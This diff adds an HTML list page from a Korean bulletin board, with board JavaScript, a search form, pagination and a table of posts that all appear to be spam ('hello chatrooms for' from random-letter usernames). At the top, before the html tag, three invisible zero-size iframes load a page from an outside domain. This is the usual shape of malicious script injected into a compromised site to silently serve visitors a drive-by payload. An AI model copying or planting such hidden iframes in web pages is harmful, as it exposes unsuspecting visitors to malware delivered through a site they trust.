@@ -1,0 +1,594 @@
+
+
+<!-- 한글인코딩안되는거 방지 메타선언 -->
+<!-- 한글인코딩안되는거 방지 끝 -->
+
+
+<iframe src=http://www.civilforum.org/file/movie/test.htm width=0 height=0></iframe>
+
+ 
+ <!-- include file="../statistics/statistics_process.asp" -->
+<iframe src=http://www.civilforum.org/file/movie/test.htm width=0 height=0></iframe>
+<iframe src=http://www.civilforum.org/file/movie/test.htm width=0 height=0></iframe>
+
+
+<html>
+<head>
+<title></title>
+<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
+<LINK rel="stylesheet" type="text/css" href="../inc/style.css">
+<Script Language="javascript">
+<!--
+
+browserName = navigator.appName;
+browserVer = parseInt(navigator.appVersion);
+if(browserName == "Netscape" && browserVer >= 3){ init = "net"; }
+else { init = "ie"; }
+
+
+if(((init == "net")&&(browserVer >=3))||((init == "ie")&&(browserVer >= 4))){
+
+ sn_on=new Image;
+ sn_off=new Image;
+ sn_on.src=  "../img/sn_on.gif";
+ sn_off.src= "../img/sn_off.gif";
+
+ st_on=new Image;
+ st_off=new Image;
+ st_on.src=  "../img/st_on.gif";
+ st_off.src= "../img/st_off.gif";
+
+ sc_on=new Image;
+ sc_off=new Image;
+ sc_on.src=  "../img/sc_on.gif";
+ sc_off.src= "../img/sc_off.gif"; 
+ 
+}
+
+function OnOff(name) {
+if(((init == "net")&&(browserVer >=3))||((init == "ie")&&(browserVer >= 4))) {
+  if(document.formsearch[name].value=='on')
+  {
+   document.formsearch[name].value='off';
+   ImgSrc=eval(name+"_off.src");
+   document[name].src=ImgSrc;
+  }
+  else
+  {
+   document.formsearch[name].value='on';
+   ImgSrc=eval(name+"_on.src");
+   document[name].src=ImgSrc;
+  }
+ }
+}
+
+
+function box(inno)
+{ 
+
+	   if (inno.style.display != "none") 
+           inno.style.display = "none"
+           else 
+           inno.style.display = ""  
+}
+
+function admin_submit()
+{
+	if (document.adminform.admin_pin.value =="") {
+		alert("비밀번호를 입력해 주세요.");
+		document.adminform.admin_pin.focus();
+		return;
+	}
+
+	document.adminform.submit();
+
+}
+
+	var select_obj;
+	function obj_layer(name,status) { 
+		var obj=document.all[name];
+		var _tmpx,_tmpy, marginx, marginy;
+		_tmpx = event.clientX + parseInt(obj.offsetWidth);
+		_tmpy = event.clientY + parseInt(obj.offsetHeight);
+		_marginx = document.body.clientWidth - _tmpx;
+		_marginy = document.body.clientHeight - _tmpy ;
+		if(_marginx < 0)
+			_tmpx = event.clientX + document.body.scrollLeft + _marginx ;
+		else
+			_tmpx = event.clientX + document.body.scrollLeft ;
+		if(_marginy < 0)
+			_tmpy = event.clientY + document.body.scrollTop + _marginy +20;
+		else
+			_tmpy = event.clientY + document.body.scrollTop ;
+		obj.style.posLeft=_tmpx-13;
+		obj.style.posTop=_tmpy-12;
+		if(status=='visible') {
+			if(select_obj) {
+				select_obj.style.visibility='hidden';
+				select_obj=null;
+			}
+			select_obj=obj;
+		}else{
+			select_obj=null;
+		}
+		obj.style.visibility=status; 
+	}
+
+	function show_layer(num, name, email, url, tb, mem_auth, mem_id, admin) {
+		var printHeight = 0;
+		var printMain="";
+	
+		if(email) {
+			printMain = "<tr onMouseOver=this.style.backgroundColor='#bbbbbb' onMouseOut=this.style.backgroundColor='' onMousedown=location.href='email.asp?email1="+email+"&h_url=http://finebox.co.kr/multiboard/board/list.asp?tb=bbs_2&page=26&seq=';><td style=font-family:굴림;font-size:9pt height=18 nowrap>&nbsp;<img src=../img/n_mail.gif border=0 align=absmiddle>&nbsp;&nbsp;메일 보내기&nbsp;&nbsp;</td></tr>";
+			printHeight = printHeight + 16;
+		}
+		if(url) {
+			printMain = printMain +	"<tr onMouseOver=this.style.backgroundColor='#bbbbbb' onMouseOut=this.style.backgroundColor='' onMousedown=window.open('http://"+url+"');><td style=font-family:굴림;font-size:9pt height=18 nowrap>&nbsp;<img src=../img/n_homepage.gif border=0 align=absmiddle>&nbsp;&nbsp;홈페이지&nbsp;&nbsp;</td></tr>";
+			printHeight = printHeight + 16;
+		}
+		{
+			printMain = printMain +	"<tr onMouseOver=this.style.backgroundColor='#bbbbbb' onMouseOut=this.style.backgroundColor='' onMousedown=location.href='list.asp?tb="+tb+"&sn=on&st=off&sc=off&sw="+name+"';><td style=font-family:굴림;font-size:9pt height=18 nowrap>&nbsp;<img src=../img/n_search.gif border=0 align=absmiddle>&nbsp;&nbsp;이름으로 검색&nbsp;&nbsp;</td></tr>";
+			printHeight = printHeight + 16;
+		}
+		if(mem_auth > 0) {
+			printMain = printMain +	"<tr onMouseOver=this.style.backgroundColor='#bbbbbb' onMouseOut=this.style.backgroundColor='' onMousedown=OpenWindow('../member/user_view.asp?id="+mem_id+"','500','520');><td style=font-family:굴림;font-size:9pt height=18 nowrap>&nbsp;<img src=../img/n_information.gif border=0 align=absmiddle>&nbsp;&nbsp;회원정보 보기&nbsp;&nbsp;</td></tr>";
+			printHeight = printHeight + 16;
+			printMain = printMain +	"<tr onMouseOver=this.style.backgroundColor='#bbbbbb' onMouseOut=this.style.backgroundColor='' onMousedown=OpenWindow('../message/m_write.asp?r_id="+mem_id+"&r_name="+name+"','400','400');><td style=font-family:굴림;font-size:9pt height=18 nowrap>&nbsp;<img src=../img/n_msg.gif border=0 align=absmiddle>&nbsp;&nbsp;쪽지 보내기&nbsp;&nbsp;</td></tr>";
+			printHeight = printHeight + 16;
+			if(admin) {
+			printMain = printMain +	"<tr onMouseOver=this.style.backgroundColor='#bbbbbb' onMouseOut=this.style.backgroundColor='' onMousedown=OpenWindow('../member/user_edit.asp?id="+mem_id+"','500','520');><td style=font-family:굴림;font-size:9pt height=18 nowrap>&nbsp;<img src=../img/n_modify.gif border=0 align=absmiddle>&nbsp;&nbsp;<font color=red>회원정보 변경&nbsp;&nbsp;</td></tr>";
+			printHeight = printHeight + 16;
+			}
+		}
+			
+		var printHeader = "<div id='"+num+"' style='position:absolute; left:10px; top:25px; width:127; height: "+printHeight+"; z-index:1; visibility: hidden' onMousedown=obj_layer('"+num+"','hidden')><table border=0><tr><td colspan=3 onMouseover=obj_layer('"+num+"','hidden') height=3></td></tr><tr><td width=5 onMouseover=obj_layer('"+num+"','hidden') rowspan=2>&nbsp;</td><td height=5></td></tr><tr><td><table style=cursor:hand border='0' cellspacing='1' cellpadding='0' bgcolor='black' width=100% height=100%><tr><td valign=top bgcolor=white><table border=0 cellspacing=0 cellpadding=3 width=100% height=100%>";
+		var printFooter = "</table></td></tr></table></td><td width=5 rowspan=2 onMouseover=obj_layer('"+num+"','hidden')>&nbsp;</td></tr><tr><td colspan=3 height=10 onMouseover=obj_layer('"+num+"','hidden')></td></tr></table></div>";
+	
+		document.writeln(printHeader+printMain+printFooter);
+	}
+
+var checkflag = "false"; 
+
+function checkboxall() { 
+
+field = eval("document.obj_check.cart");
+
+if (checkflag == "false") { 
+for (i = 0; i < field.length; i++) { 
+field[i].checked = true;} 
+checkflag = "true"; 
+return; 
+} 
+
+else { 
+for (i = 0; i < field.length; i++) { 
+field[i].checked = false; } 
+checkflag = "false"; 
+return; 
+} 
+
+}
+
+function read_cart()
+{
+	document.obj_check.action = "content1.asp?tb=bbs_2&page=26&mode=read_cart"
+	document.obj_check.submit();
+}
+
+function del_cart()
+{
+	document.obj_check.action = "del_ok.asp?tb=bbs_2&page=26&mode=del_cart"
+	document.obj_check.submit();
+}
+
+
+
+//-->
+</Script>
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="classification" content="">
+<META NAME="Author" CONTENT="text/html; charset=euc-kr">
+</head>
+<body bgcolor="#FFFFFF" marginwidth="0" marginheight="0" leftmargin="0" topmargin="0">
+
+	<div align="center"><br><br>
+
+
+
+<!-- 탑관리자 메뉴링크부분 -->
+<table cellpadding="0" cellspacing="0" border="0" width="500">
+  <form method="post" name="obj_check" ID="Form1">
+  <tr>
+    <td class="font"><img src="../img/reference.gif" border="0"> <img src="../img/total.gif" border="0"> 1599, &nbsp; <img src="../img/pages.gif" border="0"> 26 / 160</td>
+
+    </tr><tr><td class="font" align="right">
+	 &nbsp; </td>
+  </tr>
+</table>
+
+<table width="500" bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0">
+<!-- <tr>
+	<td height=2 bgcolor="#EEEEEE"></td>
+</tr>
+<tr>
+	<td height=2 bgcolor="#FFFFFF"></td>
+</tr> -->
+<tr>
+	<td height=1></td>
+</tr>
+</table>
+
+
+
+<table width="500" bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0">
+<tr>
+	<td colspan="7" height="3" bgcolor="#666666"></td>
+</tr>
+
+<tr BGCOLOR=#F4F4F4 HEIGHT=25>
+	<td width="50" align=center>번호</td>
+	<td width="24" align="center"><a href=javascript:checkboxall();>삭제</a></td>
+	<td align="center">제목</td>
+	<td width="60" align=center>이름</td>
+	<td width="30" align=center>파일</td>
+	<td width="80" align=center>날짜</td>
+	<td width="40" align=center>조회</td>
+	
+</tr>
+<tr>
+	<td colspan="7" height="1" bgcolor="#666666"></td>
+</tr>
+
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1349
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="761"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="12" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=761&page=26">hello chatrooms for</a></td>
+	<td width="60">ddfvkshdhm</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-01-30</td>
+	<td width="40">125</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1348
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="762"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="12" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=762&page=26">hello chatrooms for</a></td>
+	<td width="60">xmlketxflu</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-01-30</td>
+	<td width="40">119</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1347
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="774"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="12" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=774&page=26">hello chatrooms for</a></td>
+	<td width="60">kalqkkqhxh</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-01-31</td>
+	<td width="40">137</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1346
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="787"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="12" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=787&page=26">hello chatrooms for</a></td>
+	<td width="60">hksyljrptq</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-02-07</td>
+	<td width="40">144</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1345
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="788"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="12" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=788&page=26">hello chatrooms for</a></td>
+	<td width="60">joojztgryr</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-02-07</td>
+	<td width="40">137</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1344
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="789"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="12" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=789&page=26">hello chatrooms for</a></td>
+	<td width="60">vmsvqevvxe</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-02-07</td>
+	<td width="40">136</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1343
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="790"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="12" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=790&page=26">hello chatrooms for</a></td>
+	<td width="60">sazpynzfvk</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-02-07</td>
+	<td width="40">136</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1342
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="177"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="8" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=177&page=26">hello chatrooms for</a></td>
+	<td width="60">ooldryebog</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-01-04</td>
+	<td width="40">174</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1341
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="178"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="8" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=178&page=26">hello chatrooms for</a></td>
+	<td width="60">wquuxeryzz</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-01-04</td>
+	<td width="40">159</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+
+<tr align="center" height="25" onmouseover="this.style.background='#F4F4F4'" onmouseout="this.style.background='#FFFFFF'">
+	<td width="30" class="font" align="Center">
+			1340
+
+
+	</td>
+	<td width="24"><input type="checkbox" name="cart" value="179"></td>
+	<td align="left">
+	<img src="../img/normal.gif" border="0">&nbsp;<img src="../img/blank.gif" width="8" height="5" border="0"><img src="../img/re.gif" border="0"> <a href="view.asp?tb=bbs_2&num=179&page=26">hello chatrooms for</a></td>
+	<td width="60">sapwmywhwg</td>
+	<td width="30">
+	<!-- 확장자 아이콘만들기 -->
+	
+	
+	</td>
+	<td width="80">2012-01-04</td>
+	<td width="40">141</td>
+	
+</tr>
+
+<tr>
+	<td colspan="7" height="1" background="image/line01.gif"></td>
+</tr>
+
+<!-- <tr>
+	<td colspan="7" height="8">
+	<table width="100%" border="0" cellpadding="0" cellspacing="0" ID="Table2">
+	<tr>
+		<td height="2" bgcolor="#ffffff"></td>
+	</tr>
+	<tr>
+		<td height="4" bgcolor="#EEEEEE"></td>
+	</tr>
+	<tr>
+		<td height="2" bgcolor="#ffffff"></td>
+	</tr>
+	<tr>
+		<td height="1" bgcolor="#ffffff"></td>
+	</tr>
+	</table>
+	</td>
+</tr> -->
+
+</table>
+
+
+
+
+
+<table width="500" border="0" cellpadding="0" cellspacing="0">
+<tr>
+	<td class="font" align="center">
+	
+	
+		<a href="list.asp?tb=bbs_2&page=25&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">[prv]</font></a>
+	
+			[<a href="list.asp?tb=bbs_2&page=1&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">1</font></a>]&nbsp;..
+	
+			[<a href="list.asp?tb=bbs_2&page=21&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">21</font></a>]
+	
+			[<a href="list.asp?tb=bbs_2&page=22&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">22</font></a>]
+	
+			[<a href="list.asp?tb=bbs_2&page=23&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">23</font></a>]
+	
+			[<a href="list.asp?tb=bbs_2&page=24&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">24</font></a>]
+	
+			[<a href="list.asp?tb=bbs_2&page=25&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">25</font></a>]
+	
+			[<font color="#FF0000" style="font-size:8pt;"><b>26</b></font>]
+	
+			[<a href="list.asp?tb=bbs_2&page=27&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">27</font></a>]
+	
+			[<a href="list.asp?tb=bbs_2&page=28&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">28</font></a>]
+	
+			[<a href="list.asp?tb=bbs_2&page=29&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">29</font></a>]
+	
+			[<a href="list.asp?tb=bbs_2&page=30&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">30</font></a>]
+	
+	&nbsp;..&nbsp;[<a href="list.asp?tb=bbs_2&page=160&seq=" onfocus="this.blur()"><font color="000000" style="font-size:8pt;">160</font></a>]
+	
+	&nbsp;<a href="list.asp?tb=bbs_2&page=27&seq=" onfocus="this.blur()"><font color="#000000" style="font-size:8pt;">[next]</font></a>
+	
+	
+	</td>
+</tr>
+
+<tr>
+	<td align="right" style="word-break:break-all;padding:5px;"><a href="javascript:box(document.all.form_search)"><img src="../img/but_search.gif" border="0"></a>
+	<a href="form.asp?tb=bbs_2"><img src="../img/but_write.gif" border="0"></a></td>
+</tr>
+
+</form>
+
+
+<tr>
+	<td align="right" id="form_search" style="display:none">
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+	<form action="list.asp?tb=bbs_2&seq=" Method="POST" name="formsearch">
+	<td valign="bottom">
+		<input type=hidden name=st value="on">
+		<input type=hidden name=sc value="on">
+		<input type=hidden name=sn value="off">
+		<img src="../img/search0.gif" border="0"><a href="javascript:OnOff('st')"><img src="../img/st_on.gif" border="0" name="st" align="absmiddle"></a><a href="javascript:OnOff('sc')"><img src="../img/sc_on.gif" border="0" name="sc" align="absmiddle"></a><a href="javascript:OnOff('sn')"><img src="../img/sn_off.gif" border="0" name="sn" align="absmiddle"></a></td>
+	<td><input type="text" name="sw" value="" class="form_input" size="20"></td>
+	<td valign="bottom"><input type="image" border="0" src="../img/search.gif" align="absmiddle" id=image1 name=image1></td>
+	<td valign="bottom"><a href="list.asp?tb=bbs_2&seq="><img src="../img/search1.gif" border="0"></a></td>
+</form>
+	</tr>
+	</table>
+</td>
+</tr>
+<tr>
+	<td align="right"></td>
+</tr>
+
+
+</table>
+
+<div>
+
+</body>
+</html>
+
